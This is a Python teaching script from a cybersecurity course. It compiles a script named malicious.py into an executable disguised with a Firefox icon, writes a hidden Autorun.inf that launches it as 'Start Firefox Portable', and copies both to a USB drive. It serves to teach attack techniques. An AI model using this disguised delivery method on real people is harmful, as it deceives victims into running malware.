"""
==========================================================
Course:    COMPSFI 212 – Scripting for Cybersecurity
Module:    Chapter 2 – Initial Access (Removable Media)
Script:    AutorunSetup.py
Purpose:   Demonstrates creation of an autorun USB payload
           by compiling a Python script to EXE and writing
           an Autorun.inf file.
Author:    Dr. Md Ali
Date:      2025-08-27
Version:   1.0

Description:
    - Uses PyInstaller to turn malicious.py into benign.exe
      with a custom icon.
    - Creates Autorun.inf file which executes benign.exe.
    - Moves payload and autorun file onto a USB directory.
    - Marks Autorun.inf as hidden.
    - Mirrors textbook example for educational purposes only.

Dependencies:
    - Python 3.x
    - PyInstaller (pip install pyinstaller)
    - Windows OS

Usage:
    python AutorunSetup.py
    # Make sure malicious.py and Firefox.ico exist.
==========================================================
"""

import PyInstaller.__main__
import shutil
import os

filename = "malicious.py"
exename = "benign.exe"
icon = "Firefox.ico"
pwd = "X:"                 # Drive letter for USB (adjust as needed)
usbdir = os.path.join(pwd, "USB")

# Remove old exe if exists
if os.path.isfile(exename):
    os.remove(exename)

# Create executable from Python script
PyInstaller.__main__.run([
    filename,
    "--onefile",
    "--clean",
    "--log-level=ERROR",
    "--name=" + exename,
    "--icon=" + icon
])

# Move compiled exe and cleanup PyInstaller leftovers
shutil.move(os.path.join(pwd, "dist", exename), pwd)
shutil.rmtree("dist")
shutil.rmtree("build")
shutil.rmtree("__pycache__")
os.remove(exename + ".spec")

# Create Autorun.inf file
with open("Autorun.inf", "w") as o:
    o.write("[Autorun]\n")
    o.write("Open=" + exename + "\n")
    o.write("Action=Start Firefox Portable\n")
    o.write("Label=My USB\n")
    o.write("Icon=" + exename + "\n")

# Move files to USB and mark Autorun.inf hidden
shutil.move(exename, usbdir)
shutil.move("Autorun.inf", usbdir)
os.system("attrib +h \"" + os.path.join(usbdir, "Autorun.inf") + "\"")

